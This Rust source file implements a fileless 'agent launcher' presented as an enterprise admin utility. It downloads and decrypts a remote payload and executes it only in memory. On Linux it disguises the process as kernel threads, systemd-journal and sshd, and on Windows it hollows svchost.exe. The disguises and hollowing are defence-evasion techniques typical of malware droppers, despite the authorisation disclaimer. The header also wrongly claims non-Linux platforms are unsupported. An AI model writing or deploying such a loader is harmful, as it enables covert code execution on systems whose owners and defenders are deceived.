//! Orchestra in-memory agent launcher.
//!
//! # Purpose
//!
//! For enterprise deployment scenarios where IT administrators want to run the
//! Orchestra agent on a managed endpoint **without** persisting an executable
//! to disk, this small utility:
//!
//! 1. Downloads an AES-256-GCM-encrypted agent payload over HTTPS.
//! 2. Decrypts it in process memory using a pre-shared key supplied on the
//!    command line.
//! 3. On Linux, materialises the decrypted ELF inside an anonymous
//!    `memfd_create` file descriptor and `execve`s `/proc/self/fd/<fd>`,
//!    inheriting the launcher's argv/env. Nothing is ever written to a
//!    real filesystem.
//! 4. On non-Linux platforms the in-memory primitive is unavailable; the
//!    launcher logs a clear error and exits with a non-zero status.
//!
//! # Authorisation
//!
//! This binary is intended **only** for use by administrators who own the
//! managed endpoint or have written authorisation to operate it. Running it
//! against systems you do not control may violate computer-misuse law in
//! your jurisdiction.

use anyhow::{anyhow, Context, Result};
use base64::Engine;
use clap::Parser;
use common::CryptoSession;
use rand::seq::SliceRandom;

#[derive(Parser, Debug)]
#[command(
    author,
    version,
    about = "Download, decrypt, and execute an Orchestra agent payload entirely in memory."
)]
struct Cli {
    /// Full HTTPS URL of the encrypted payload (e.g.
    /// `https://updates.example.com/agent.enc`).
    #[arg(long)]
    url: String,

    /// Base64-encoded AES-256 pre-shared key used to decrypt the payload.
    #[arg(long)]
    key: String,

    /// Optional arguments to pass to the launched agent process.
    #[arg(last = true)]
    agent_args: Vec<String>,
}

/// Download `url`, retrying up to `max_attempts` times with exponential
/// backoff. Never logs the URL more than once or any response body content.
async fn download_with_retry(url: &str, max_attempts: u32) -> Result<Vec<u8>> {
    let mut delay = std::time::Duration::from_millis(500);
    let mut last_err: Option<anyhow::Error> = None;
    for attempt in 1..=max_attempts {
        tracing::info!(attempt, max_attempts, "downloading encrypted payload");
        match reqwest::get(url).await {
            Ok(resp) => match resp.error_for_status() {
                Ok(ok) => match ok.bytes().await {
                    Ok(bytes) => return Ok(bytes.to_vec()),
                    Err(e) => last_err = Some(anyhow!("read body failed: {e}")),
                },
                Err(e) => last_err = Some(anyhow!("HTTP error: {e}")),
            },
            Err(e) => last_err = Some(anyhow!("request failed: {e}")),
        }
        if attempt < max_attempts {
            tracing::warn!(?delay, "download failed; backing off");
            tokio::time::sleep(delay).await;
            delay *= 2;
        }
    }
    Err(last_err.unwrap_or_else(|| anyhow!("download failed")))
}

#[tokio::main]
async fn main() -> Result<()> {
    tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .init();

    let cli = Cli::parse();

    let key_bytes = base64::engine::general_purpose::STANDARD
        .decode(&cli.key)
        .context("--key is not valid Base64")?;
    let session = CryptoSession::from_shared_secret(&key_bytes);

    let encrypted = download_with_retry(&cli.url, 3).await?;
    tracing::info!(bytes = encrypted.len(), "payload downloaded");

    let decrypted = session
        .decrypt(&encrypted)
        .map_err(|e| anyhow!("Payload decryption failed: {e}"))?;
    tracing::info!(bytes = decrypted.len(), "payload decrypted");

    execute_in_memory(&decrypted, &cli.agent_args)
}

#[cfg(target_os = "linux")]
fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
    use std::ffi::CString;
    use std::io::Write;
    use std::os::unix::io::FromRawFd;

    // Obfuscate memfd name
    let mut rng = rand::thread_rng();
    let potential_names = ["systemd-journal", "kworker/u16:0", "rcu_preempt"];
    let chosen_name = *potential_names.choose(&mut rng).unwrap();
    let name = CString::new(format!("{}-{}", chosen_name, std::process::id())).unwrap();

    // SAFETY: `name` is a valid nul-terminated C string.
    let fd = unsafe { libc::memfd_create(name.as_ptr(), 0) };
    if fd == -1 {
        return Err(anyhow!(
            "memfd_create failed: {}",
            std::io::Error::last_os_error()
        ));
    }
    // SAFETY: `fd` is a valid descriptor we just created and own.
    let mut file = unsafe { std::fs::File::from_raw_fd(fd) };
    file.write_all(payload)
        .context("Failed to write payload into memfd")?;

    let path = CString::new(format!("/proc/self/fd/{fd}")).unwrap();

    // Obfuscate argv[0]
    let argv0 = CString::new("/usr/sbin/sshd").unwrap();
    let mut argv: Vec<CString> = std::iter::once(argv0)
        .chain(
            args.iter()
                .map(|a| CString::new(a.as_str()).expect("arg has interior NUL")),
        )
        .collect();
    let argv_ptrs: Vec<*const libc::c_char> = argv
        .iter_mut()
        .map(|c| c.as_ptr())
        .chain(std::iter::once(std::ptr::null()))
        .collect();

    // Only log in debug builds
    #[cfg(debug_assertions)]
    tracing::info!("executing payload via /proc/self/fd/{fd}");

    // SAFETY: `path` and `argv_ptrs` are valid nul-terminated arrays.
    unsafe {
        libc::execv(path.as_ptr(), argv_ptrs.as_ptr());
    }
    // If we reach here, execv failed.
    Err(anyhow!("execv failed: {}", std::io::Error::last_os_error()))
}

#[cfg(target_os = "macos")]
fn execute_in_memory(payload: &[u8], args: &[String]) -> Result<()> {
    // Development-only fallback: macOS does not expose a stable
    // anonymous-fd-exec primitive comparable to memfd_create + execv, and a
    // real production deployment would use a code-signed launcher. For the
    // dev workflow we materialise the payload into a temporary file and exec it.
    use std::io::Write;
    use std::os::unix::fs::OpenOptionsExt;
    use std::os::unix::process::CommandExt;
    tracing::warn!(
        "macOS: in-memory exec not available; using temp-file fallback (development only)"
    );
    // Use a random component in the filename to mitigate symlink attacks, and
    // create the file with mode 0o700 atomically so it is never world-readable.
    let random_suffix: u64 = rand::random();
    let path = std::env::temp_dir()
        .join(format!("orchestra-agent-{:x}", random_suffix));
    let mut file = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)   // fails if path already exists → no TOCTOU race
        .mode(0o700)        // owner-execute only, set atomically on create
        .open(&path)
        .with_context(|| format!("failed to create temp file {}", path.display()))?;
    file.write_all(payload)
        .with_context(|| "failed to write payload to temp file")?;
    drop(file); // close before exec
    let mut child = std::process::Command::new(&path).args(args).spawn()?;
    let _ = std::fs::remove_file(&path);
    let status = child.wait()?;
    std::process::exit(status.code().unwrap_or(1));
}

#[cfg(target_os = "windows")]
fn execute_in_memory(payload: &[u8], _args: &[String]) -> Result<()> {
    // Windows path: spawn a host process suspended (svchost.exe), allocate
    // RWX memory in it, copy the decrypted PE payload into that memory,
    // redirect the entry point in the thread context, and resume the
    // thread. Implementation lives in the shared `hollowing` crate so the
    // agent's `MigrateAgent` capability and this launcher use exactly the
    // same primitive.
    //
    // The launched payload runs detached from this process and inherits no
    // arguments, so `_args` is intentionally unused; arguments must be
    // baked into the payload at build time (`cargo build --release` with
    // any compile-time flags the agent needs).
    tracing::info!(
        bytes = payload.len(),
        "launching payload via process hollowing into svchost.exe"
    );
    hollowing::hollow_and_execute(payload).map_err(|e| anyhow!("process hollowing failed: {e}"))
}

#[cfg(not(any(target_os = "linux", target_os = "macos", target_os = "windows")))]
fn execute_in_memory(_payload: &[u8], _args: &[String]) -> Result<()> {
    Err(anyhow!(
        "Unsupported platform for in-memory agent execution"
    ))
}
